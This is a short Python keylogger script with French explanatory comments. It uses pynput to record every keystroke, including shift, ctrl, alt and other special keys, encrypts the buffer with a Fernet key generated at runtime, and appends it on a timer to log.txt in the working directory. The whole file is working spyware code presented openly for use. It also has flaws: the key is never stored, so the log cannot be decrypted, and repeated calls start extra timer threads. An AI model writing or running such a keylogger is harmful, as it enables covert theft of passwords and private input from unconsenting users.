import os  # Module pour interagir avec le système d'exploitation
import threading  # Module pour exécuter des tâches en parallèle
from pynput import keyboard  # Module pour écouter les événements du clavier
from cryptography.fernet import Fernet  # Module pour chiffrer les données (à installer via pip)

# Clé de chiffrement générée pour sécuriser les frappes (tu peux la sauvegarder pour plus de sécurité)
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Initialiser une chaîne vide pour enregistrer les frappes
log = ""

# Définit le chemin du fichier de log (ici, dans le répertoire courant)
log_path = os.path.join(os.getcwd(), "log.txt")

# Fonction pour traiter les touches pressées
def processkeys(key):
    global log  # Indique que nous allons utiliser la variable log définie en dehors de cette fonction
    try:
        # Vérifie si la touche pressée est un caractère imprimable
        if key.char is not None:
            log += key.char  # Ajoute le caractère à la chaîne de log
    except AttributeError:
        # Gérer les touches spéciales
        if key == keyboard.Key.space:
            log += " "  # Ajoute un espace pour la touche espace
        elif key == keyboard.Key.enter:
            log += "\n"  # Ajoute un retour à la ligne pour la touche Entrée
        elif key == keyboard.Key.backspace:
            log = log[:-1]  # Supprime le dernier caractère pour la touche Retour arrière
        elif key == keyboard.Key.shift:
            log += "[SHIFT]"  # Indique que la touche Shift a été pressée
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            log += "[CTRL]"  # Indique que la touche Ctrl a été pressée
        elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            log += "[ALT]"  # Indique que la touche Alt a été pressée
        else:
            log += f"[{key}]"  # Capturer toutes les autres touches spéciales

    # Appelle la fonction report régulièrement pour enregistrer les frappes dans le fichier
    if len(log) > 50:  # Enregistrer après 50 caractères pour éviter trop de frappes en mémoire
        report()

# Fonction pour enregistrer les frappes dans un fichier
def report():
    global log, log_path
    if log:  # Si log n'est pas vide
        encrypted_log = cipher_suite.encrypt(log.encode())  # Chiffre les frappes de clavier
        with open(log_path, "ab") as logfile:  # "ab" pour écrire en mode binaire et ajout
            logfile.write(encrypted_log + b"\n")  # Écrire les données chiffrées
        log = ""  # Réinitialise la chaîne log

    # Relancer la fonction après 10 secondes
    threading.Timer(10, report).start()

# Démarrer l'enregistrement périodique dès le début
report()

# Créer un écouteur de clavier qui appelle processkeys pour chaque touche pressée
keyboard_listener = keyboard.Listener(on_press=processkeys)

# Démarre l'écouteur
with keyboard_listener:
    keyboard_listener.join()  # Attend indéfiniment que l'utilisateur termineSS
